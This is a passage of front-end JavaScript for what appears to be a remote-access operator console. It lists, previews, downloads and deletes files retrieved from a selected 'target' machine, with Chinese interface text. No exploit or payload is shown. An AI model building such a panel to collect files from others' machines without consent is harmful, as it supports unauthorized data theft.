        hex += row.join(" ").padEnd(48) + "\n";
      }
      body = `<pre>${esc(hex)}</pre><p class="hint">二进制文件不预览内容，用「存到本机」拿走。</p>`;
    }
    pane.innerHTML = `<div class="preview">${head}${body}</div>`;
    $("grab-save").onclick = () => downloadBlob(blob, rec.Name || "file.bin");
  };
  const loadList = async () => {
    const data = await api("/api/files?target=" + encodeURIComponent(targetKey));
    const files = data.Files || [];
    $("grab-list").innerHTML = table(["文件名", "大小", "来源路径", "时间", "操作"], files.map((rec) => `<tr class="files clickable"><td>${esc(rec.Name)}</td><td>${sizeText(rec.Size)}</td><td class="mono">${esc(rec.SourcePath)}</td><td>${whenISO(rec.At)}</td><td><button class="mini" data-save="${esc(rec.ID)}">存到本机</button> <button class="mini danger" data-del="${esc(rec.ID)}">删除</button></td></tr>`));
    $("grab-list").querySelectorAll("tr.clickable").forEach((row, idx) => {
      row.onclick = (event) => {
        if (event.target.closest("button")) return;
        preview(files[idx]);
      };
    });
    $("grab-list").querySelectorAll("button[data-save]").forEach((btn) => {
      btn.onclick = async (event) => {
        event.stopPropagation();
        const rec = files.find((item) => item.ID === btn.dataset.save);
        const res = await api("/api/files/raw?id=" + encodeURIComponent(btn.dataset.save));
        downloadBlob(await res.blob(), (rec && rec.Name) || "file.bin");
      };
    });
    $("grab-list").querySelectorAll("button[data-del]").forEach((btn) => {
      btn.onclick = async (event) => {
        event.stopPropagation();
        try {
          await api("/api/files?id=" + encodeURIComponent(btn.dataset.del), { method: "DELETE" });
        } catch (err) { /* 已被删过就算了 */ }
        $("grab-preview").innerHTML = "";
        loadList();
      };
    });
    if (!files.length) $("grab-list").innerHTML = `<p class="hint">还没有从这台机器拿回文件。</p>`;
  };
  loadList();
}

function whenISO(v) {
  if (!v) return "—";
  const d = new Date(v);
  return isNaN(d) ? "—" : d.toLocaleString();
}

boot();
